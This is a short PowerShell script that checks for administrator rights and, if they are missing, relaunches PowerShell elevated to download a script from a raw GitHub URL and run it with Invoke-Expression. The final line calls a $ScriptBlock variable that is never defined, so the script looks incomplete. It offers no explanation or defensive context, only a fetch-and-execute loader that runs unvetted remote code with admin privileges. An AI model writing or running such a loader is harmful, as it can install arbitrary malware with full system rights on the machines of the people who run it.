If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $runasbox = {$i=(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/tuithall/trung/main/trungit');iex($i)}
    Start-Process powershell $runasbox.ToString() -Verb RunAs 
    Exit
}
iex ($ScriptBlock.ToString())
